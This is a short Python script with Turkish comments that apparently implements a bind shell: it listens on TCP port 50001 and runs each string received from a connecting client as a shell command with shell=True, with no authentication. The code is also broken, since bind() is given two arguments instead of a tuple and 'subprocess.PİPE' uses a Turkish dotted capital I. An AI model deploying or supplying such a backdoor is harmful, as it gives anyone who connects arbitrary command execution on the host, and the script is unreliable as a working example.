import socket
import subprocess
from http.client import responses

#ip adresi ve port tanıma
host ="xxx.x.x.x"#host ip ata random
port = 50001
#socket oluşturma ve sunucuya bağlama
server_socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
server_socket.bind(host,port)
server_socket.listen()
#Bağlantıyı Kabul Etme
conn,addr = server_socket.accept()
print("connected from : "+ str(addr))

while True:
    #Veri Alma ve İşleme Döngüsü
    data = conn.recv(1024).decode()
    print(data)
    #Komut Çalıştırma
    result = subprocess.run(data,stdout=subprocess.PİPE,shell=True)
    #Çıktıyı Gönderme
    if(result.stdout.decode()!=""):
        response_data =("command executed").encode()
        conn.send(response_data)
        
conn.close()